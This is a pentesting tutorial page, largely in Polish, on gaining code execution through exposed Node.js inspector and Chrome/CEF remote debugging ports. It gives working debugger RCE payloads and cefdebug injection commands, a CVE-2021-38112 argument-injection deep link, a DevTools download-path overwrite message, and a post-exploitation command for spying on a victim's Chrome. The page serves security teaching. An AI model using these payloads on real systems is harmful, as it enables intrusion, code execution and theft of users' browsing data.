# Node inspector/CEF debug abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Gdy uruchomiony z przełącznikiem `--inspect`, proces Node.js nasłuchuje na klienta debugowania. Domyślnie nasłuchuje na hoście i porcie **`127.0.0.1:9229`**. Każdemu procesowi przypisany jest również **unikalny** **UUID**.

Klienci inspektora muszą znać i określić adres hosta, port i UUID, aby się połączyć. Pełny adres URL będzie wyglądał mniej więcej tak: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Ponieważ **debugger ma pełny dostęp do środowiska wykonawczego Node.js**, złośliwy aktor, który może połączyć się z tym portem, może być w stanie wykonać dowolny kod w imieniu procesu Node.js (**potencjalne podniesienie uprawnień**).
{% endhint %}

Istnieje kilka sposobów na uruchomienie inspektora:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Kiedy uruchomisz proces do inspekcji, coś takiego się pojawi:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesy oparte na **CEF** (**Chromium Embedded Framework**) muszą używać parametru: `--remote-debugging-port=9222`, aby otworzyć **debugger** (ochrony SSRF pozostają bardzo podobne). Jednak **zamiast** przyznawania sesji **debug** **NodeJS**, będą komunikować się z przeglądarką za pomocą [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), jest to interfejs do kontrolowania przeglądarki, ale nie ma bezpośredniego RCE.

Kiedy uruchomisz debugowaną przeglądarkę, coś takiego się pojawi:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Strony internetowe otwarte w przeglądarce mogą wysyłać żądania WebSocket i HTTP zgodnie z modelem bezpieczeństwa przeglądarki. **Początkowe połączenie HTTP** jest konieczne do **uzyskania unikalnego identyfikatora sesji debuggera**. **Polityka same-origin** **zapobiega** stronom internetowym w nawiązywaniu **tego połączenia HTTP**. Dla dodatkowego bezpieczeństwa przed [**atakami DNS rebinding**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js weryfikuje, że **nagłówki 'Host'** dla połączenia albo określają **adres IP**, albo **`localhost`**, albo **`localhost6`** dokładnie.

{% hint style="info" %}
Te **środki bezpieczeństwa zapobiegają wykorzystaniu inspektora** do uruchamiania kodu poprzez **wysłanie żądania HTTP** (co mogłoby być zrealizowane poprzez wykorzystanie luki SSRF).
{% endhint %}

### Starting inspector in running processes

Możesz wysłać **sygnał SIGUSR1** do działającego procesu nodejs, aby **uruchomić inspektora** na domyślnym porcie. Należy jednak pamiętać, że musisz mieć wystarczające uprawnienia, więc może to dać ci **uprzywilejowany dostęp do informacji wewnątrz procesu**, ale nie bezpośrednią eskalację uprawnień.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
To przydatne w kontenerach, ponieważ **zamknięcie procesu i uruchomienie nowego** z `--inspect` **nie jest opcją**, ponieważ **kontener** zostanie **zabity** razem z procesem.
{% endhint %}

### Połączenie z inspektorem/debuggerem

Aby połączyć się z **przeglądarką opartą na Chromium**, można uzyskać dostęp do adresów URL `chrome://inspect` lub `edge://inspect` dla Chrome lub Edge, odpowiednio. Klikając przycisk Konfiguruj, należy upewnić się, że **docelowy host i port** są poprawnie wymienione. Obrazek pokazuje przykład zdalnego wykonania kodu (RCE):

![](<../../.gitbook/assets/image (674).png>)

Używając **wiersza poleceń**, możesz połączyć się z debuggerem/inspektorem za pomocą:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Narzędzie [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) pozwala na **znalezienie inspektorów** działających lokalnie i **wstrzyknięcie kodu** do nich.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Zauważ, że **eksploity RCE w NodeJS nie będą działać**, jeśli są połączone z przeglądarką za pomocą [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (musisz sprawdzić API, aby znaleźć interesujące rzeczy do zrobienia z tym).
{% endhint %}

## RCE w Debuggerze/Inspektorze NodeJS

{% hint style="info" %}
Jeśli przyszedłeś tutaj, szukając jak uzyskać [**RCE z XSS w Electron, sprawdź tę stronę.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Niektóre powszechne sposoby uzyskania **RCE**, gdy możesz **połączyć** się z **inspektorem** Node, to użycie czegoś takiego (wygląda na to, że **to nie zadziała w połączeniu z protokołem Chrome DevTools**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

Możesz sprawdzić API tutaj: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
W tej sekcji po prostu wymienię interesujące rzeczy, które znalazłem, a które ludzie wykorzystali do eksploatacji tego protokołu.

### Wstrzykiwanie parametrów za pomocą głębokich linków

W [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) firma Rhino Security odkryła, że aplikacja oparta na CEF **zarejestrowała niestandardowy URI** w systemie (workspaces://), który odbierał pełny URI, a następnie **uruchamiał aplikację opartą na CEF** z konfiguracją, która była częściowo konstruowana z tego URI.

Odkryto, że parametry URI były dekodowane URL i używane do uruchomienia podstawowej aplikacji CEF, co pozwalało użytkownikowi **wstrzyknąć** flagę **`--gpu-launcher`** w **wierszu poleceń** i wykonywać dowolne rzeczy.

Więc, ładunek taki jak:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Wykona calc.exe.

### Nadpisywanie plików

Zmień folder, w którym **pobrane pliki będą zapisywane** i pobierz plik, aby **nadpisać** często używany **kod źródłowy** aplikacji swoim **złośliwym kodem**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE i eksfiltracja

Zgodnie z tym postem: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) możliwe jest uzyskanie RCE i eksfiltracja wewnętrznych stron z theriver.

### Po eksploatacji

W rzeczywistym środowisku i **po skompromitowaniu** komputera użytkownika, który używa przeglądarki opartej na Chrome/Chromium, możesz uruchomić proces Chrome z **włączonym debugowaniem i przekierować port debugowania**, aby uzyskać do niego dostęp. W ten sposób będziesz mógł **inspekcjonować wszystko, co ofiara robi w Chrome i kraść wrażliwe informacje**.

Sposobem na zachowanie dyskrecji jest **zakończenie każdego procesu Chrome** i następnie wywołanie czegoś takiego jak
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
